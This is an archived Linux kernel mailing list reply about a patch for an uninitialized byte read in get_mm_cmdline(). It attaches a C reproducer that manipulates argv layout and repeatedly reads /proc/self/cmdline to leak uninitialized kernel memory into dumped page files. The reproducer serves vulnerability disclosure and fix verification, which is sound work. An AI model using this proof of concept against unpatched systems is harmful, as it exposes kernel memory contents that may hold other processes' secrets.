Return-Path: <linux-fsdevel-owner@vger.kernel.org>
X-Original-To: lists+linux-fsdevel@lfdr.de
Delivered-To: lists+linux-fsdevel@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by mail.lfdr.de (Postfix) with ESMTP id 422C767A62
	for <lists+linux-fsdevel@lfdr.de>; Sat, 13 Jul 2019 16:09:47 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1727656AbfGMOJa (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
        Sat, 13 Jul 2019 10:09:30 -0400
Received: from bran.ispras.ru ([83.149.199.196]:31577 "EHLO smtp.ispras.ru"
        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
        id S1727504AbfGMOJ3 (ORCPT <rfc822;linux-fsdevel@vger.kernel.org>);
        Sat, 13 Jul 2019 10:09:29 -0400
Received: from [10.10.3.112] (starling.intra.ispras.ru [10.10.3.112])
        by smtp.ispras.ru (Postfix) with ESMTP id 05CFE201D0;
        Sat, 13 Jul 2019 17:09:28 +0300 (MSK)
Subject: Re: [PATCH] proc: Fix uninitialized byte read in get_mm_cmdline()
To:     Alexey Dobriyan <adobriyan@gmail.com>
Cc:     Oleg Nesterov <oleg@redhat.com>, linux-kernel@vger.kernel.org,
        linux-fsdevel@vger.kernel.org, security@kernel.org
References: <20190712160913.17727-1-izbyshev@ispras.ru>
 <20190712163625.GF21989@redhat.com> <20190712174632.GA3175@avx2>
 <3de2d71b-37be-6238-7fd8-0a40c9b94a98@ispras.ru>
 <20190713072606.GA23167@avx2>
From:   Alexey Izbyshev <izbyshev@ispras.ru>
Message-ID: <2cba2f3d-4a7c-ddeb-fbd7-e2aafb728493@ispras.ru>
Date:   Sat, 13 Jul 2019 17:09:27 +0300
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
 Thunderbird/60.7.1
MIME-Version: 1.0
In-Reply-To: <20190713072606.GA23167@avx2>
Content-Type: multipart/mixed;
 boundary="------------C43CA79F4814729DBF8EE52C"
Content-Language: en-US
Sender: linux-fsdevel-owner@vger.kernel.org
Precedence: bulk
List-ID: <linux-fsdevel.vger.kernel.org>
X-Mailing-List: linux-fsdevel@vger.kernel.org

This is a multi-part message in MIME format.
--------------C43CA79F4814729DBF8EE52C
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit

On 7/13/19 10:26 AM, Alexey Dobriyan wrote:
> On Fri, Jul 12, 2019 at 09:43:03PM +0300, Alexey Izbyshev wrote:
>> On 7/12/19 8:46 PM, Alexey Dobriyan wrote:
>>> The proper fix to all /proc/*/cmdline problems is to revert
>>>
>>> 	f5b65348fd77839b50e79bc0a5e536832ea52d8d
>>> 	proc: fix missing final NUL in get_mm_cmdline() rewrite
>>>
>>> 	5ab8271899658042fabc5ae7e6a99066a210bc0e
>>> 	fs/proc: simplify and clarify get_mm_cmdline() function
>>>
>> Should this be interpreted as an actual suggestion to revert the patches,
>> fix the conflicts, test and submit them, or is this more like thinking out
>> loud?
> 
> Of course! Do you have a reproducer?
> 
Attached.

Alexey

--------------C43CA79F4814729DBF8EE52C
Content-Type: text/x-csrc;
 name="dump-page.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
 filename="dump-page.c"

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE 4096

#define CHECK(expr) \
  ({ \
    long r = (expr); \
    if (r < 0) { \
      perror(#expr); \
      exit(1); \
    } \
    r; \
  })

static void dump(unsigned char *page, size_t ind) {
    char fname[30];
    sprintf(fname, "page%zu", ind);
    printf("dumping %s\n", fname);
    int fd = CHECK(open(fname, O_CREAT|O_TRUNC|O_WRONLY, 0666));
    CHECK(write(fd, page, PAGE_SIZE));
    close(fd);
}

int main(int argc, char *argv[], char *envp[]) {
    char *last_arg_nul = argv[argc - 1] + strlen(argv[argc - 1]);
    printf("last arg end: %p\n", last_arg_nul);
    size_t argv_size = last_arg_nul - argv[0] + 1;
    size_t page_offset = (uintptr_t)last_arg_nul & (PAGE_SIZE - 1);
    if (page_offset != PAGE_SIZE - 1 || argv_size < PAGE_SIZE - 1) {
        printf("will re-exec to arrange argv\n");
        if (page_offset != PAGE_SIZE - 1) {
            /* Pad env block so that the last byte of arg block is also
             * the last byte of its page. */
            size_t env0_size = page_offset + 1 + strlen(envp[0]) + 1;
            char *new_env = malloc(env0_size);
            memset(new_env, 'Z', env0_size - 1);
            new_env[env0_size - 1] = '\0';
            envp[0] = new_env;
        }
        char *path = argv[0];
        if (argv_size < PAGE_SIZE) {
          /* Also make sure that arg block is not shorter than a page. */
          argv[0] = (char[]){[0 ... PAGE_SIZE - 1] = 'Z', '\0'};
        }
        execve(path, argv, envp);
        perror("execve");
        return 127;
    }

    *last_arg_nul = 'Z';
    /* Make sure the kernel can't read past arg_end. */
    CHECK(mprotect(last_arg_nul + 1, PAGE_SIZE, PROT_NONE));

    char buf[PAGE_SIZE];
    unsigned char leaked[PAGE_SIZE] = {'U'};
    unsigned num_good = 0;
    int fd = CHECK(open("/proc/self/cmdline", O_RDONLY));
    while (1) {
        int found_good = 0;
        for (size_t off = 1; off < PAGE_SIZE; ++off) {
            CHECK(lseek(fd, argv_size - off, SEEK_SET));
            ssize_t got = CHECK(read(fd, buf, sizeof buf));
            if (got <= off) {
                printf("no leak: kernel seems to be fixed\n");
                return 1;
            }
            unsigned char leaked_byte = buf[got - 1];
            found_good |= (leaked_byte && leaked_byte != 'Z');
            leaked[off] = leaked_byte;
        }
        if (found_good)
            dump(leaked, num_good++);
        sleep(1);
    }

    close(fd);
    return 0;
}

--------------C43CA79F4814729DBF8EE52C--
